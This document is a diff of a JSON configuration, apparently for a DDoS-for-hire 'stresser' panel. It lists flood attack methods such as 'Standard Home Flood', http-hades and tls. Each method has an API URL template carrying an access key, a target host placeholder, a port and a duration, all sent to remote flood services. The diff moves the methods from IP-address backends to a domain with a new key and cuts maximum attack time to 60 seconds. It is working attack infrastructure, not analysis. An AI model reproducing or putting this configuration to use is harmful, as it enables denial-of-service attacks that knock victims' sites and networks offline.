@@ -2,26 +2,26 @@
      "Attacks" : [
 
           {
-               "Name" : "http-hades",
-               "AttackName" : "LKZ-HOME",
+               "Name" : "https",
+               "AttackName" : "https",
                "Description" : "Standard Home Flood",
-               "API" : "http://139.162.32.68/ohshit.php?key=teststresser&host=<<$target>>&time=<<$duration>>&method=HTTP-HADES",
+               "API" : "https://phuongthuy.love/api?key=ventox999&host=<<$target>>&time=<<$duration>>&method=https",
                "moderation" : {
                     "LimitMaxTime" : false,
-                    "MaxTime" : 300
+                    "MaxTime" : 60
                },
                "DefaultPort" : "80",
                "AdminMethod" : false,
                "VipMethod" : false
           },         
           {
-               "Name" : "ack",
-               "AttackName" : "LKZ-HOME",
+               "Name" : "tls",
+               "AttackName" : "tls",
                "Description" : "Standard Home Flood",
-               "API" : "http://45.95.55.21/api.php?key=boatnetxnxx&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=BROWSER",
+               "API" : "https://phuongthuy.love/api?key=ventox999&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tls",
                "moderation" : {
                     "LimitMaxTime" : false,
-                    "MaxTime" : 300
+                    "MaxTime" : 60
                },
                "DefaultPort" : "80",
                "AdminMethod" : false,
